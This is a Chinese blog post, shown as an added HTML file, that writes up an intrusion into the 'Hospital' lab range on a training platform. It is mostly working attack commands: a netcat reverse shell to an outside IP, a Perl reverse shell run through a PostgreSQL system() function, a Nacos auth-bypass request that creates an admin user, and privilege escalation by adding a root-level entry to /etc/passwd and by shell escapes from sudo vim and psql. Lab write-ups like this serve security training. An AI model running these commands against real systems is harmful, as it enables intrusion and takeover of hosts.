@@ -1,0 +1,257 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
+    <title>Hospital - MoonlitSyntax</title>
+
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body class="l-body">
+
+<nav class="c-nav">
+    <a href="/" class="c-nav__link">首页</a>
+    <a href="/archives" class="c-nav__link">归档</a>
+    <a href="/tags" class="c-nav__link">标签</a>
+    <a href="/categories" class="c-nav__link">分类</a>
+    <a href="/links" class="c-nav__link">友链</a>
+    <a href="/about" class="c-nav__link">关于</a>
+    <button id="search-button" class="c-nav__search-btn">
+        <i class="fas fa-search"></i>
+    </button>
+</nav>
+
+
+<div class="l-container">
+    <div class="l-nav-spacer"></div>
+    <main class="l-main">
+        
+<div class="c-post">
+    <aside class="c-post__toc">
+        <h2 class="c-post__toc-title">目录</h2>
+        
+        <ol class="c-post__toc-list" id="toc-list"></ol>
+        
+    </aside>
+    <div class="c-post__main">
+        <header class="c-post__header">
+            <h1 class="c-post__title">Hospital</h1>
+            <div class="c-post__meta">
+                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2024-01-11 17:49</span>
+                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2024-09-11 10:47</span>
+                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/%e6%b8%97%e9%80%8f"><strong>渗透</strong></a></span>
+            </div>
+            <div class="c-post__tags">
+                <a href="/tags/%e6%98%a5%e7%a7%8b%e4%ba%91%e9%95%9c" class="c-post__tag">#春秋云镜</a>
+            </div>
+            <div class="c-post__description">
+                春秋云镜靶场
+            </div>
+        </header>
+
+        <article class="c-post__content prose"><p>先扫目录,扫出/actuator/泄露</p>
+<p>8080端口一眼shiro,直接去找key</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar ~/Downloads/heapdump 
+</span></span></code></pre></div></div><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808160059.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808160059.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>key是<code>GAYysgMQhG7/CzIJlVpR2g==</code></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808163910.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808163910.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>无语啊,不要勾选AES GCM</p>
+<p>我是傻逼,没看清扫描的结果</p>
+<p>连上内存马之后发现是app权限,并且好像没有开启ssh,直接反弹shell</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 8.149.142.195 9999 &gt;/tmp/f
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null
+</span></span></code></pre></div></div><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808165215.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808165215.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>vim这个很可疑,去看看</p>
+<p>猜测是vim</p>
+<p>看看</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">sudo /usr/bin/vim.basic -c &#39;:!/bin/bash&#39;
+</span></span></code></pre></div></div><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808165513.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808165513.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>不能提权?但是能直接vim</p>
+<p>好像开了22,直接写root key权限好像不能改,但是能写passwd,试试看呢</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">openssl passwd -1 -salt new 123
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">写入passwd
+</span></span><span class="line"><span class="cl">new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
+</span></span></code></pre></div></div><p>成功root了</p>
+<p>现在写sshkey</p>
+<p>可以ssh了</p>
+<p>之后上fscan或者viper,这里先上下viper,接着改上代理了</p>
+<h2 id="内网">内网</h2>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">./fscan_amd64 -h 172.30.12.5/24
+</span></span></code></pre></div></div><h3 id="扫描结果">扫描结果</h3>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">172.30.12.6 WORKGROUP\SERVER02      
+</span></span><span class="line"><span class="cl">172.30.12.5 本机,已拿下
+</span></span><span class="line"><span class="cl">172.30.12.236 web
+</span></span></code></pre></div></div><p>看这个</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">[+] http://172.30.12.6:8848 poc-yaml-alibaba-nacos 
+</span></span><span class="line"><span class="cl">[+] http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass 
+</span></span><span class="line"><span class="cl">[+] http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file 
+</span></span></code></pre></div></div><h3 id="nacos">nacos</h3>
+<p>nacos洞,我们先上代理,用emmm的gost</p>
+<p><code>gost -L socks5://:1080</code></p>
+<p>nohup argument_1 &gt; output.log 2&gt;&amp;1 &amp;</p>
+<p>不懂为什么不开在ipv4</p>
+<p>还是改用chisel了</p>
+<p>挂上chisel就正常了,先打扫出来的</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">poc-yaml-alibaba-nacos-v1-auth-bypass 
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">curl -X GET &#39;http://172.30.12.6:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&#39;
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">{&#34;totalCount&#34;:1,&#34;pageNumber&#34;:1,&#34;pagesAvailable&#34;:1,&#34;pageItems&#34;:[{&#34;username&#34;:&#34;nacos&#34;,&#34;password&#34;:&#34;$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu&#34;}]}⏎           
+</span></span></code></pre></div></div><p>但是我解不出来hash</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">curl -X POST &#39;http://172.30.12.6:8848/nacos/v1/auth/users?username=admin&amp;password=admin&#39; -H &#39;User-Agent: Nacos-Server&#39; | python -m json.tool
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">结果
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    &#34;code&#34;: 200,
+</span></span><span class="line"><span class="cl">    &#34;message&#34;: &#34;create user ok!&#34;,
+</span></span><span class="line"><span class="cl">    &#34;data&#34;: null
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div></div><p>再跑一遍就能发现我们的用户已经被创建了,那么直接登录</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808173240.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808173240.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>admin admin成功登录</p>
+<p>但是登录没有什么作用</p>
+<p>nacos实现rce有两种方法,一种是SnakeYaml反序列化,一种是Hessian 反序列化漏洞</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808173909.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808173909.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><code>python3 -m http.server 8000</code></p>
+<p>起个web服务</p>
+<p>然后<div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808174914.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808174914.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>这样就好了,接下来rdp上去</p>
+<p>成功了</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">flag02: flag{66b2f660-4c55-4887-9dfd-ec81cf81c5dc}
+</span></span></code></pre></div></div><p>由于我们是管理员权限,可以直接拿到了</p>
+<h3 id="后台管理">后台管理</h3>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">172.30.12.236:8009 open
+</span></span><span class="line"><span class="cl">172.30.12.236:22 open
+</span></span><span class="line"><span class="cl">172.30.12.236:8080 open
+</span></span></code></pre></div></div><p>枚举8009端口</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"> nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 172.30.12.236
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>可以看到有fastjson依赖,用burp插件扫描</p>
+<p>直接写马链接了,有效载荷记得改成java</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808183358.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808183358.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>在哥斯拉上直接写ssh,进去拿flag</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">root@web03:~# ifconfig
+</span></span><span class="line"><span class="cl">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+</span></span><span class="line"><span class="cl">        inet 172.30.12.236  netmask 255.255.0.0  broadcast 172.30.255.255
+</span></span><span class="line"><span class="cl">        inet6 fe80::216:3eff:fe02:9736  prefixlen 64  scopeid 0x20&lt;link&gt;
+</span></span><span class="line"><span class="cl">        ether 00:16:3e:02:97:36  txqueuelen 1000  (Ethernet)
+</span></span><span class="line"><span class="cl">        RX packets 107137  bytes 121562871 (121.5 MB)
+</span></span><span class="line"><span class="cl">        RX errors 0  dropped 0  overruns 0  frame 0
+</span></span><span class="line"><span class="cl">        TX packets 39758  bytes 12788172 (12.7 MB)
+</span></span><span class="line"><span class="cl">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+</span></span><span class="line"><span class="cl">        inet 172.30.54.179  netmask 255.255.255.0  broadcast 172.30.54.255
+</span></span><span class="line"><span class="cl">        inet6 fe80::216:3eff:fe07:de56  prefixlen 64  scopeid 0x20&lt;link&gt;
+</span></span><span class="line"><span class="cl">        ether 00:16:3e:07:de:56  txqueuelen 1000  (Ethernet)
+</span></span><span class="line"><span class="cl">        RX packets 1588  bytes 66696 (66.6 KB)
+</span></span><span class="line"><span class="cl">        RX errors 0  dropped 0  overruns 0  frame 0
+</span></span><span class="line"><span class="cl">        TX packets 1607  bytes 68162 (68.1 KB)
+</span></span><span class="line"><span class="cl">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+</span></span><span class="line"><span class="cl">        inet 127.0.0.1  netmask 255.0.0.0
+</span></span><span class="line"><span class="cl">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+</span></span><span class="line"><span class="cl">        loop  txqueuelen 1000  (Local Loopback)
+</span></span><span class="line"><span class="cl">        RX packets 2865  bytes 248972 (248.9 KB)
+</span></span><span class="line"><span class="cl">        RX errors 0  dropped 0  overruns 0  frame 0
+</span></span><span class="line"><span class="cl">        TX packets 2865  bytes 248972 (248.9 KB)
+</span></span><span class="line"><span class="cl">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span></span></code></pre></div></div><p>最后一台机器的端倪</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">172.30.54.179 
+</span></span></code></pre></div></div><h3 id="最后一台">最后一台</h3>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">[*] WebTitle: http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login
+</span></span><span class="line"><span class="cl">[*] WebTitle: http://172.30.54.179:8080 code:200 len:3964   title:医院后台管理平台
+</span></span><span class="line"><span class="cl">[*] WebTitle: http://172.30.54.12:3000/login code:200 len:27909  title:Grafana
+</span></span></code></pre></div></div><p>那还得做个代理啊</p>
+<p>存在弱口令admin admin</p>
+<p>登录之后没啥用</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">22/tcp   open  ssh
+</span></span><span class="line"><span class="cl">3000/tcp open  ppp
+</span></span><span class="line"><span class="cl">5432/tcp open  postgresql
+</span></span></code></pre></div></div><p>在之前那个web03</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">./grafanaExp_linux_amd64 exp -u http://172.30.54.12:3000
+</span></span></code></pre></div></div><p>读出来密码</p>
+<p>这里是在web03上装了软件</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">sudo apt update
+</span></span><span class="line"><span class="cl">sudo apt install postgresql-client
+</span></span></code></pre></div></div><p>然后</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">psql -h 172.30.54.12 -p 5432 -U postgres
+</span></span></code></pre></div></div><p>如果不能装,也能在本地p4,考验多重代理的时候到了</p>
+<p>正常弹shell</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">sql</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="sql"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="k">CREATE</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="k">REPLACE</span><span class="w"> </span><span class="k">FUNCTION</span><span class="w"> </span><span class="k">system</span><span class="w"> </span><span class="p">(</span><span class="n">cstring</span><span class="p">)</span><span class="w"> </span><span class="k">RETURNS</span><span class="w"> </span><span class="nb">integer</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;system&#39;</span><span class="w"> </span><span class="k">LANGUAGE</span><span class="w"> </span><span class="s1">&#39;c&#39;</span><span class="w"> </span><span class="k">STRICT</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">system</span><span class="p">(</span><span class="s1">&#39;perl -e \&#39;</span><span class="n">use</span><span class="w"> </span><span class="n">Socket</span><span class="p">;</span><span class="err">$</span><span class="n">i</span><span class="o">=</span><span class="s2">&#34;172.30.54.179&#34;</span><span class="p">;</span><span class="err">$</span><span class="n">p</span><span class="o">=</span><span class="mi">9999</span><span class="p">;</span><span class="n">socket</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">PF_INET</span><span class="p">,</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="n">getprotobyname</span><span class="p">(</span><span class="s2">&#34;tcp&#34;</span><span class="p">));</span><span class="k">if</span><span class="p">(</span><span class="k">connect</span><span class="p">(</span><span class="n">S</span><span class="p">,</span><span class="n">sockaddr_in</span><span class="p">(</span><span class="err">$</span><span class="n">p</span><span class="p">,</span><span class="n">inet_aton</span><span class="p">(</span><span class="err">$</span><span class="n">i</span><span class="p">))))</span><span class="err">{</span><span class="k">open</span><span class="p">(</span><span class="k">STDIN</span><span class="p">,</span><span class="s2">&#34;&gt;&amp;S&#34;</span><span class="p">);</span><span class="k">open</span><span class="p">(</span><span class="k">STDOUT</span><span class="p">,</span><span class="s2">&#34;&gt;&amp;S&#34;</span><span class="p">);</span><span class="k">open</span><span class="p">(</span><span class="n">STDERR</span><span class="p">,</span><span class="s2">&#34;&gt;&amp;S&#34;</span><span class="p">);</span><span class="k">exec</span><span class="p">(</span><span class="s2">&#34;/bin/sh -i&#34;</span><span class="p">);</span><span class="err">}</span><span class="p">;</span><span class="err">\</span><span class="s1">&#39;&#39;</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span></code></pre></div></div><p>提权</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">sudo /usr/local/postgresql/bin/psql
+</span></span><span class="line"><span class="cl">\?
+</span></span><span class="line"><span class="cl">!/bin/bash
+</span></span><span class="line"><span class="cl">cat /root/flag/flag04.txt
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>这里要输入root的密码,可以用</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">select usename, passwd from pg_shadow;
+</span></span></code></pre></div></div><p>来获取md5值</p>
+<p>买不起</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808185859.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240808185859.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>所以</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">ALTER USER root WITH PASSWORD &#39;Admin@123&#39;;
+</span></span></code></pre></div></div><p>直接把root密码给改了</p>
+</article>
+
+        <nav class="c-post__nav">
+            
+            <a href="/post/greatwall" class="c-post__nav-card c-post__nav-card--prev">
+                <h3>‹ 上一篇</h3>
+                <p class="c-post__nav-title">GreatWall</p>
+            </a>
+            
+
+            
+            <a href="/post/%e6%97%a0%e9%97%b4%e8%ae%a1%e5%88%92" class="c-post__nav-card c-post__nav-card--next">
+                <h3>下一篇 ›</h3>
+                <p class="c-post__nav-title">无间计划</p>
+            </a>
+            
+        </nav>
+    </div>
+</div>
+
+    </main>
+    <footer class="c-footer">
+        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
+        <div class="c-footer__copy">
+            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
+        </div>
+    </footer>
+</div>
+
+<div id="algolia-search-mask" class="c-search-mask"></div>
+<div id="algolia-search-modal" class="c-search-modal">
+    <div class="c-search-modal__box">
+        <div class="c-search-modal__header">搜索</div>
+        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
